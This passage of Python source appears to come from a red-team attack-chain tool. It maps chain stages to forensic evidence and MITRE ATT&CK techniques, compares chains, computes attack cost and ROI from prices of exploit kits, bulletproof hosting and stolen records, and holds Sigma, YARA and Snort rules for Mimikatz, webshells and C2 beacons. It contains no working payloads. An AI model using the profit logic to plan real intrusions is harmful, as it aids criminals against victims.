                    'artifact_type': evidence_type['artifact'],
                    'source_node': node.get('id'),
                    'source_name': node_name,
                    'description': f"Evidence from {node_name}",
                    'status': 'pending',
                    'collected_at': None,
                    'hashes': {},
                    'metadata': {
                        'node_type': node_type,
                        'chain_position': nodes.index(node)
                    }
                }
                collected.append(evidence_item)
                self.evidence_items.append(evidence_item)
        
        return collected
    
    def _determine_evidence(self, node_type: str) -> List[Dict]:
        """Determine expected evidence types from node type"""
        evidence_mapping = {
            'scan': [{'category': 'network', 'artifact': 'pcap'}],
            'exploit': [
                {'category': 'network', 'artifact': 'pcap'},
                {'category': 'host', 'artifact': 'memory_dump'}
            ],
            'malware': [
                {'category': 'malware', 'artifact': 'binary_sample'},
                {'category': 'host', 'artifact': 'memory_dump'}
            ],
            'lateral': [
                {'category': 'network', 'artifact': 'netflow'},
                {'category': 'identity', 'artifact': 'auth_logs'}
            ],
            'exfil': [
                {'category': 'network', 'artifact': 'pcap'},
                {'category': 'application', 'artifact': 'app_logs'}
            ],
            'persist': [
                {'category': 'host', 'artifact': 'registry'},
                {'category': 'timeline', 'artifact': 'filesystem_timeline'}
            ],
            'c2': [
                {'category': 'network', 'artifact': 'dns_logs'},
                {'category': 'network', 'artifact': 'proxy_logs'}
            ],
            'credential': [
                {'category': 'identity', 'artifact': 'credential_dump'},
                {'category': 'host', 'artifact': 'memory_dump'}
            ]
        }
        
        for key, evidence in evidence_mapping.items():
            if key in node_type:
                return evidence
        
        # Default evidence
        return [{'category': 'host', 'artifact': 'event_logs'}]
    
    def mark_collected(self, evidence_id: str, hashes: Dict, 
                      collector: str) -> bool:
        """Mark evidence as collected"""
        for item in self.evidence_items:
            if item['evidence_id'] == evidence_id:
                item['status'] = 'collected'
                item['collected_at'] = datetime.now().isoformat()
                item['hashes'] = hashes
                
                self.chain_of_custody.append({
                    'action': 'evidence_collected',
                    'evidence_id': evidence_id,
                    'timestamp': datetime.now().isoformat(),
                    'collector': collector,
                    'hashes': hashes
                })
                return True
        return False
    
    def transfer_custody(self, evidence_id: str, from_person: str, 
                        to_person: str, reason: str) -> bool:
        """Transfer custody of evidence"""
        for item in self.evidence_items:
            if item['evidence_id'] == evidence_id:
                self.chain_of_custody.append({
                    'action': 'custody_transfer',
                    'evidence_id': evidence_id,
                    'timestamp': datetime.now().isoformat(),
                    'from': from_person,
                    'to': to_person,
                    'reason': reason
                })
                return True
        return False
    
    def generate_evidence_report(self) -> str:
        """Generate forensic evidence report"""
        report = ["=" * 70, "FORENSIC EVIDENCE COLLECTION REPORT", "=" * 70, ""]
        
        report.append(f"Collection ID: {self.collection_id}")
        report.append(f"Total Evidence Items: {len(self.evidence_items)}")
        report.append(f"Chain of Custody Entries: {len(self.chain_of_custody)}")
        report.append("")
        
        # Evidence by category
        report.append("EVIDENCE BY CATEGORY")
        report.append("-" * 50)
        
        by_category: Dict[str, List] = {}
        for item in self.evidence_items:
            cat = item['category']
            if cat not in by_category:
                by_category[cat] = []
            by_category[cat].append(item)
        
        for category, items in by_category.items():
            cat_info = self.EVIDENCE_CATEGORIES.get(category, {'name': category})
            report.append(f"\n{cat_info['name']} ({len(items)} items):")
            for item in items[:5]:
                status_icon = "‚úì" if item['status'] == 'collected' else "‚óã"
                report.append(f"  {status_icon} {item['evidence_id']}: {item['artifact_type']}")
                report.append(f"      Source: {item['source_name']}")
        
        # Chain of custody
        report.append("")
        report.append("CHAIN OF CUSTODY")
        report.append("-" * 50)
        for entry in self.chain_of_custody[-10:]:  # Last 10 entries
            report.append(f"  [{entry['timestamp']}] {entry['action']}")
        
        return "\n".join(report)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# MITRE ATT&CK NAVIGATOR INTEGRATION - ATT&CK layer generation
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class MITRENavigatorExporter:
    """
    Export attack chains to MITRE ATT&CK Navigator format
    """
    
    # ATT&CK Matrix structure
    ATTACK_TACTICS = {
        'reconnaissance': {'id': 'TA0043', 'name': 'Reconnaissance'},
        'resource_development': {'id': 'TA0042', 'name': 'Resource Development'},
        'initial_access': {'id': 'TA0001', 'name': 'Initial Access'},
        'execution': {'id': 'TA0002', 'name': 'Execution'},
        'persistence': {'id': 'TA0003', 'name': 'Persistence'},
        'privilege_escalation': {'id': 'TA0004', 'name': 'Privilege Escalation'},
        'defense_evasion': {'id': 'TA0005', 'name': 'Defense Evasion'},
        'credential_access': {'id': 'TA0006', 'name': 'Credential Access'},
        'discovery': {'id': 'TA0007', 'name': 'Discovery'},
        'lateral_movement': {'id': 'TA0008', 'name': 'Lateral Movement'},
        'collection': {'id': 'TA0009', 'name': 'Collection'},
        'command_control': {'id': 'TA0011', 'name': 'Command and Control'},
        'exfiltration': {'id': 'TA0010', 'name': 'Exfiltration'},
        'impact': {'id': 'TA0040', 'name': 'Impact'}
    }
    
    # Common technique mappings
    TECHNIQUE_MAPPINGS = {
        'phish': {'id': 'T1566', 'name': 'Phishing', 'tactic': 'initial_access'},
        'exploit': {'id': 'T1203', 'name': 'Exploitation for Client Execution', 'tactic': 'execution'},
        'powershell': {'id': 'T1059.001', 'name': 'PowerShell', 'tactic': 'execution'},
        'wmi': {'id': 'T1047', 'name': 'Windows Management Instrumentation', 'tactic': 'execution'},
        'registry': {'id': 'T1547.001', 'name': 'Registry Run Keys', 'tactic': 'persistence'},
        'service': {'id': 'T1543.003', 'name': 'Windows Service', 'tactic': 'persistence'},
        'scheduled': {'id': 'T1053', 'name': 'Scheduled Task/Job', 'tactic': 'persistence'},
        'token': {'id': 'T1134', 'name': 'Access Token Manipulation', 'tactic': 'privilege_escalation'},
        'sudo': {'id': 'T1548.003', 'name': 'Sudo and Sudo Caching', 'tactic': 'privilege_escalation'},
        'obfuscat': {'id': 'T1027', 'name': 'Obfuscated Files or Information', 'tactic': 'defense_evasion'},
        'mimikatz': {'id': 'T1003', 'name': 'OS Credential Dumping', 'tactic': 'credential_access'},
        'keylog': {'id': 'T1056.001', 'name': 'Keylogging', 'tactic': 'collection'},
        'screen': {'id': 'T1113', 'name': 'Screen Capture', 'tactic': 'collection'},
        'lateral': {'id': 'T1021', 'name': 'Remote Services', 'tactic': 'lateral_movement'},
        'smb': {'id': 'T1021.002', 'name': 'SMB/Windows Admin Shares', 'tactic': 'lateral_movement'},
        'rdp': {'id': 'T1021.001', 'name': 'Remote Desktop Protocol', 'tactic': 'lateral_movement'},
        'http': {'id': 'T1071.001', 'name': 'Web Protocols', 'tactic': 'command_control'},
        'dns': {'id': 'T1071.004', 'name': 'DNS', 'tactic': 'command_control'},
        'exfil': {'id': 'T1041', 'name': 'Exfiltration Over C2 Channel', 'tactic': 'exfiltration'},
        'ransom': {'id': 'T1486', 'name': 'Data Encrypted for Impact', 'tactic': 'impact'},
        'destroy': {'id': 'T1485', 'name': 'Data Destruction', 'tactic': 'impact'},
        'scan': {'id': 'T1595', 'name': 'Active Scanning', 'tactic': 'reconnaissance'},
        'osint': {'id': 'T1593', 'name': 'Search Open Websites/Domains', 'tactic': 'reconnaissance'}
    }
    
    def __init__(self):
        self.layer_version = "4.5"
        self.attack_version = "14"
        
    def export_to_navigator(self, nodes: List[Dict], chain_name: str = "Attack Chain",
                           description: str = "") -> Dict:
        """Export chain to ATT&CK Navigator JSON format"""
        techniques = []
        
        for node in nodes:
            technique_info = self._map_node_to_technique(node)
            if technique_info:
                techniques.append({
                    'techniqueID': technique_info['id'],
                    'tactic': self.ATTACK_TACTICS.get(technique_info['tactic'], {}).get('id', ''),
                    'color': self._get_color_for_node(node),
                    'comment': f"From chain node: {node.get('name', 'Unknown')}",
                    'enabled': True,
                    'score': node.get('score', 1)
                })
        
        layer = {
            'name': chain_name,
            'versions': {
                'attack': self.attack_version,
                'navigator': self.layer_version,
                'layer': '4.5'
            },
            'domain': 'enterprise-attack',
            'description': description or f"Attack chain with {len(nodes)} stages",
            'filters': {
                'platforms': ['Windows', 'Linux', 'macOS', 'Network', 'Cloud']
            },
            'sorting': 0,
            'layout': {
                'layout': 'side',
                'aggregateFunction': 'average',
                'showID': True,
                'showName': True
            },
            'hideDisabled': False,
            'techniques': techniques,
            'gradient': {
                'colors': ['#ff6666', '#ffff66', '#66ff66'],
                'minValue': 0,
                'maxValue': 100
            },
            'legendItems': [
                {'label': 'Executed', 'color': '#ff6666'},
                {'label': 'Planned', 'color': '#66ccff'},
                {'label': 'Optional', 'color': '#66ff66'}
            ],
            'metadata': [],
            'links': [],
            'showTacticRowBackground': True,
            'tacticRowBackground': '#dddddd',
            'selectTechniquesAcrossTactics': True,
            'selectSubtechniquesWithParent': False
        }
        
        return layer
    
    def _map_node_to_technique(self, node: Dict) -> Optional[Dict]:
        """Map a chain node to an ATT&CK technique"""
        node_type = node.get('type', '').lower()
        node_name = node.get('name', '').lower()
        
        # Check direct mapping
        if 'technique_id' in node:
            return {
                'id': node['technique_id'],
                'name': node.get('technique_name', 'Unknown'),
                'tactic': node.get('tactic', 'execution')
            }
        
        # Check keyword mappings
        for keyword, technique in self.TECHNIQUE_MAPPINGS.items():
            if keyword in node_type or keyword in node_name:
                return technique
        
        # Default to generic technique
        return {'id': 'T1059', 'name': 'Command and Scripting Interpreter', 'tactic': 'execution'}
    
    def _get_color_for_node(self, node: Dict) -> str:
        """Get color for node based on status/type"""
        status = node.get('status', 'planned')
        colors = {
            'executed': '#ff6666',
            'running': '#ffaa66',
            'planned': '#66ccff',
            'optional': '#66ff66',
            'failed': '#cc6666'
        }
        return colors.get(status, '#66ccff')
    
    def export_to_json(self, layer: Dict) -> str:
        """Export layer to JSON string"""
        return json.dumps(layer, indent=2)
    
    def get_coverage_stats(self, nodes: List[Dict]) -> Dict:
        """Get ATT&CK coverage statistics"""
        tactics_covered = set()
        techniques_used = set()
        
        for node in nodes:
            technique_info = self._map_node_to_technique(node)
            if technique_info:
                techniques_used.add(technique_info['id'])
                tactics_covered.add(technique_info['tactic'])
        
        return {
            'tactics_covered': len(tactics_covered),
            'total_tactics': len(self.ATTACK_TACTICS),
            'tactics_percent': round(len(tactics_covered) / len(self.ATTACK_TACTICS) * 100, 1),
            'techniques_used': len(techniques_used),
            'tactics_list': list(tactics_covered),
            'techniques_list': list(techniques_used)
        }


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# CHAIN COMPARISON TOOL - Compare and diff attack chains
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class ChainComparator:
    """
    Compare two attack chains for differences and similarities
    """
    
    def __init__(self):
        self.comparison_cache: Dict[str, Dict] = {}
    
    def compare_chains(self, chain_a: Dict, chain_b: Dict) -> Dict:
        """Compare two attack chains"""
        nodes_a = chain_a.get('nodes', [])
        nodes_b = chain_b.get('nodes', [])
        edges_a = chain_a.get('edges', [])
        edges_b = chain_b.get('edges', [])
        
        # Compare nodes
        node_comparison = self._compare_nodes(nodes_a, nodes_b)
        
        # Compare edges
        edge_comparison = self._compare_edges(edges_a, edges_b)
        
        # Calculate similarity score
        similarity = self._calculate_similarity(node_comparison, edge_comparison)
        
        # Generate diff
        diff = self._generate_diff(nodes_a, nodes_b, edges_a, edges_b)
        
        return {
            'chain_a_name': chain_a.get('name', 'Chain A'),
            'chain_b_name': chain_b.get('name', 'Chain B'),
            'node_comparison': node_comparison,
            'edge_comparison': edge_comparison,
            'similarity_score': similarity,
            'diff': diff,
            'recommendations': self._generate_recommendations(diff)
        }
    
    def _compare_nodes(self, nodes_a: List[Dict], nodes_b: List[Dict]) -> Dict:
        """Compare nodes between chains"""
        types_a = set(n.get('type', '') for n in nodes_a)
        types_b = set(n.get('type', '') for n in nodes_b)
        
        return {
            'count_a': len(nodes_a),
            'count_b': len(nodes_b),
            'unique_types_a': len(types_a),
            'unique_types_b': len(types_b),
            'common_types': list(types_a & types_b),
            'only_in_a': list(types_a - types_b),
            'only_in_b': list(types_b - types_a),
            'type_overlap': len(types_a & types_b) / max(len(types_a | types_b), 1)
        }
    
    def _compare_edges(self, edges_a: List[Dict], edges_b: List[Dict]) -> Dict:
        """Compare edges between chains"""
        return {
            'count_a': len(edges_a),
            'count_b': len(edges_b),
            'density_a': len(edges_a) / max(len(set(e.get('source') for e in edges_a) | 
                                               set(e.get('target') for e in edges_a)), 1),
            'density_b': len(edges_b) / max(len(set(e.get('source') for e in edges_b) | 
                                               set(e.get('target') for e in edges_b)), 1)
        }
    
    def _calculate_similarity(self, node_comp: Dict, edge_comp: Dict) -> float:
        """Calculate overall similarity score"""
        type_similarity = node_comp['type_overlap']
        
        count_diff = abs(node_comp['count_a'] - node_comp['count_b'])
        count_similarity = 1 - (count_diff / max(node_comp['count_a'], node_comp['count_b'], 1))
        
        edge_diff = abs(edge_comp['count_a'] - edge_comp['count_b'])
        edge_similarity = 1 - (edge_diff / max(edge_comp['count_a'], edge_comp['count_b'], 1))
        
        return round((type_similarity * 0.5 + count_similarity * 0.3 + edge_similarity * 0.2), 2)
    
    def _generate_diff(self, nodes_a: List, nodes_b: List, 
                       edges_a: List, edges_b: List) -> Dict:
        """Generate diff between chains"""
        return {
            'added_nodes': [n for n in nodes_b if n.get('type') not in 
                          [na.get('type') for na in nodes_a]],
            'removed_nodes': [n for n in nodes_a if n.get('type') not in 
                            [nb.get('type') for nb in nodes_b]],
            'added_edges': len(edges_b) - len(edges_a) if len(edges_b) > len(edges_a) else 0,
            'removed_edges': len(edges_a) - len(edges_b) if len(edges_a) > len(edges_b) else 0,
            'structural_changes': abs(len(nodes_a) - len(nodes_b)) > 2
        }
    
    def _generate_recommendations(self, diff: Dict) -> List[str]:
        """Generate recommendations based on diff"""
        recs = []
        
        if diff['added_nodes']:
            recs.append(f"Consider adding {len(diff['added_nodes'])} new attack stages")
        
        if diff['removed_nodes']:
            recs.append(f"Review if {len(diff['removed_nodes'])} stages are still needed")
        
        if diff['structural_changes']:
            recs.append("Significant structural differences detected - review chain logic")
        
        if not recs:
            recs.append("Chains are similar - no major changes recommended")
        
        return recs
    
    def generate_visual_diff(self, comparison: Dict) -> str:
        """Generate visual diff representation"""
        output = [
            "=" * 60,
            "CHAIN COMPARISON ANALYSIS",
            "=" * 60,
            "",
            f"Chain A: {comparison['chain_a_name']}",
            f"Chain B: {comparison['chain_b_name']}",
            f"Similarity Score: {comparison['similarity_score'] * 100:.1f}%",
            "",
            "NODE COMPARISON",
            "-" * 40,
            f"Chain A: {comparison['node_comparison']['count_a']} nodes",
            f"Chain B: {comparison['node_comparison']['count_b']} nodes",
            "",
            "Common Types:",
            *[f"  ‚úì {t}" for t in comparison['node_comparison']['common_types'][:5]],
            "",
            "Only in Chain A:",
            *[f"  - {t}" for t in comparison['node_comparison']['only_in_a'][:5]],
            "",
            "Only in Chain B:",
            *[f"  + {t}" for t in comparison['node_comparison']['only_in_b'][:5]],
            "",
            "RECOMMENDATIONS",
            "-" * 40,
            *[f"‚Ä¢ {r}" for r in comparison['recommendations']]
        ]
        
        return "\n".join(output)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# ATTACK COST CALCULATOR - Calculate financial impact of attacks
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class AttackCostCalculator:
    """
    Calculate financial costs and ROI for attack chains
    """
    
    # Cost factors
    COST_CATEGORIES = {
        'tools': {
            'exploit_kit': 5000,
            'c2_framework': 2000,
            'custom_malware': 15000,
            'phishing_kit': 500,
            'credential_tool': 1000,
            'persistence_tool': 800
        },
        'infrastructure': {
            'vps_monthly': 50,
            'domain': 15,
            'ssl_cert': 100,
            'bulletproof_hosting': 500,
            'proxy_chain': 200
        },
        'personnel': {
            'junior_operator': 100,  # per hour
            'senior_operator': 250,
            'developer': 200,
            'osint_analyst': 150
        },
        'risk': {
            'legal_exposure': 50000,
            'attribution_risk': 25000,
            'operational_risk': 10000
        }
    }
    
    # Target value estimates
    TARGET_VALUES = {
        'pii_record': 150,
        'credit_card': 25,
        'medical_record': 250,
        'credential_pair': 10,
        'intellectual_property': 500000,
        'ransomware_payment': 100000,
        'crypto_wallet': 50000
    }
    
    def __init__(self):
        self.calculations: List[Dict] = []
    
    def calculate_chain_cost(self, nodes: List[Dict], 
                            duration_hours: int = 40) -> Dict:
        """Calculate total cost of executing an attack chain"""
        costs = {
            'tools': 0,
            'infrastructure': 0,
            'personnel': 0,
            'total': 0
        }
        
        tool_list = []
        infra_list = []
        
        for node in nodes:
            node_type = node.get('type', '').lower()
            
            # Tool costs
            if 'exploit' in node_type:
                costs['tools'] += self.COST_CATEGORIES['tools']['exploit_kit']
                tool_list.append('exploit_kit')
            if 'malware' in node_type or 'payload' in node_type:
                costs['tools'] += self.COST_CATEGORIES['tools']['custom_malware']
                tool_list.append('custom_malware')
            if 'phish' in node_type:
                costs['tools'] += self.COST_CATEGORIES['tools']['phishing_kit']
                tool_list.append('phishing_kit')
            if 'c2' in node_type:
                costs['tools'] += self.COST_CATEGORIES['tools']['c2_framework']
                tool_list.append('c2_framework')
            
            # Infrastructure
            if 'c2' in node_type or 'exfil' in node_type:
                costs['infrastructure'] += self.COST_CATEGORIES['infrastructure']['vps_monthly']
                costs['infrastructure'] += self.COST_CATEGORIES['infrastructure']['domain']
                infra_list.extend(['vps', 'domain'])
        
        # Personnel costs
        costs['personnel'] = duration_hours * self.COST_CATEGORIES['personnel']['senior_operator']
        
        costs['total'] = costs['tools'] + costs['infrastructure'] + costs['personnel']
        
        return {
            'breakdown': costs,
            'tools_used': list(set(tool_list)),
            'infrastructure_used': list(set(infra_list)),
            'duration_hours': duration_hours,
            'cost_per_node': round(costs['total'] / max(len(nodes), 1), 2)
        }
    
    def calculate_potential_value(self, nodes: List[Dict]) -> Dict:
        """Calculate potential value/impact of the attack"""
        value = {
            'min_value': 0,
            'max_value': 0,
            'expected_value': 0,
            'value_sources': []
        }
        
        for node in nodes:
            node_type = node.get('type', '').lower()
            
            if 'credential' in node_type or 'dump' in node_type:
                # Estimate 1000 credentials
                value['min_value'] += 1000 * self.TARGET_VALUES['credential_pair']
                value['max_value'] += 10000 * self.TARGET_VALUES['credential_pair']
                value['value_sources'].append('credentials')
            
            if 'exfil' in node_type:
                value['min_value'] += 100 * self.TARGET_VALUES['pii_record']
                value['max_value'] += 100000 * self.TARGET_VALUES['pii_record']
                value['value_sources'].append('pii_data')
            
            if 'ransom' in node_type:
                value['min_value'] += self.TARGET_VALUES['ransomware_payment'] * 0.5
                value['max_value'] += self.TARGET_VALUES['ransomware_payment'] * 5
                value['value_sources'].append('ransomware')
            
            if 'ip' in node_type or 'intellectual' in node_type:
                value['min_value'] += self.TARGET_VALUES['intellectual_property'] * 0.1
                value['max_value'] += self.TARGET_VALUES['intellectual_property']
                value['value_sources'].append('intellectual_property')
        
        value['expected_value'] = (value['min_value'] + value['max_value']) / 2
        value['value_sources'] = list(set(value['value_sources']))
        
        return value
    
    def calculate_roi(self, cost: Dict, value: Dict, 
                     success_probability: float = 0.5) -> Dict:
        """Calculate ROI of attack chain"""
        total_cost = cost['breakdown']['total']
        expected_value = value['expected_value'] * success_probability
        
        roi = (expected_value - total_cost) / max(total_cost, 1)
        
        return {
            'total_investment': total_cost,
            'expected_return': round(expected_value, 2),
            'roi_percent': round(roi * 100, 2),
            'breakeven_probability': round(total_cost / max(value['max_value'], 1), 4),
            'risk_adjusted_value': round(expected_value, 2),
            'profitable': roi > 0,
            'recommendation': 'Proceed' if roi > 0.5 else 'Reconsider' if roi > 0 else 'Abort'
        }
    
    def generate_cost_report(self, cost: Dict, value: Dict, roi: Dict) -> str:
        """Generate financial analysis report"""
        report = [
            "=" * 60,
            "ATTACK CHAIN FINANCIAL ANALYSIS",
            "=" * 60,
            "",
            "COST BREAKDOWN",
            "-" * 40,
            f"  Tools:          ${cost['breakdown']['tools']:,.2f}",
            f"  Infrastructure: ${cost['breakdown']['infrastructure']:,.2f}",
            f"  Personnel:      ${cost['breakdown']['personnel']:,.2f}",
            f"  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ",
            f"  TOTAL:          ${cost['breakdown']['total']:,.2f}",
            "",
            "POTENTIAL VALUE",
            "-" * 40,
            f"  Minimum:  ${value['min_value']:,.2f}",
            f"  Maximum:  ${value['max_value']:,.2f}",
            f"  Expected: ${value['expected_value']:,.2f}",
            f"  Sources:  {', '.join(value['value_sources'])}",
            "",
            "ROI ANALYSIS",
            "-" * 40,
            f"  ROI:                {roi['roi_percent']:+.1f}%",
            f"  Breakeven Prob:     {roi['breakeven_probability']*100:.1f}%",
            f"  Risk-Adjusted Val:  ${roi['risk_adjusted_value']:,.2f}",
            f"  Profitable:         {'Yes' if roi['profitable'] else 'No'}",
            f"  Recommendation:     {roi['recommendation']}",
            ""
        ]
        
        return "\n".join(report)


# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
# ATTACK DETECTION SIMULATOR - Simulate defender detection capabilities
# ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class DetectionSimulator:
    """
    Simulate how different security controls would detect the attack chain
    """
    
    # Security control definitions
    SECURITY_CONTROLS = {
        'siem': {
            'name': 'SIEM',
            'description': 'Security Information and Event Management',
            'detection_types': ['log_anomaly', 'correlation', 'baseline_deviation'],
            'coverage': 0.7,
            'latency_minutes': 5
        },
        'edr': {
            'name': 'EDR',
            'description': 'Endpoint Detection and Response',
            'detection_types': ['process_behavior', 'memory_injection', 'file_activity'],
            'coverage': 0.85,
            'latency_minutes': 1
        },
        'ndr': {
            'name': 'NDR',
            'description': 'Network Detection and Response',
            'detection_types': ['traffic_anomaly', 'c2_beacon', 'exfiltration'],
            'coverage': 0.75,
            'latency_minutes': 2
        },
        'dlp': {
            'name': 'DLP',
            'description': 'Data Loss Prevention',
            'detection_types': ['data_exfil', 'sensitive_access', 'policy_violation'],
            'coverage': 0.6,
            'latency_minutes': 3
        },
        'ueba': {
            'name': 'UEBA',
            'description': 'User and Entity Behavior Analytics',
            'detection_types': ['user_anomaly', 'access_pattern', 'privilege_abuse'],
            'coverage': 0.65,
            'latency_minutes': 15
        },
        'av': {
            'name': 'Antivirus',
            'description': 'Traditional Antivirus',
            'detection_types': ['signature', 'heuristic'],
            'coverage': 0.4,
            'latency_minutes': 0
        },
        'waf': {
            'name': 'WAF',
            'description': 'Web Application Firewall',
            'detection_types': ['sqli', 'xss', 'injection', 'web_attack'],
            'coverage': 0.7,
            'latency_minutes': 0
        },
        'deception': {
            'name': 'Deception',
            'description': 'Honeypots and Deception Technology',
            'detection_types': ['lateral_movement', 'enumeration', 'credential_use'],
            'coverage': 0.3,
            'latency_minutes': 0
        }
    }
    
    # Detection rule templates
    DETECTION_RULES = {
        'sigma': {
            'phishing': 'title: Phishing Email Execution\nstatus: experimental\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    ParentImage|endswith: "\\outlook.exe"\n  condition: selection',
            'mimikatz': 'title: Mimikatz Usage\nstatus: stable\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - "sekurlsa"\n      - "kerberos"\n  condition: selection',
            'lateral': 'title: Lateral Movement via SMB\nstatus: experimental\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4648\n  condition: selection'
        },
        'yara': {
            'malware': 'rule Malware_Generic {\n  strings:\n    $mz = { 4D 5A }\n    $suspicious = "CreateRemoteThread"\n  condition:\n    $mz at 0 and $suspicious\n}',
            'webshell': 'rule WebShell_Generic {\n  strings:\n    $php = "<?php"\n    $eval = "eval($_"\n  condition:\n    $php and $eval\n}'
        },
        'snort': {
            'c2_beacon': 'alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"Possible C2 Beacon"; flow:established,to_server; content:"|00 00 00|"; offset:0; depth:3; sid:1000001;)',
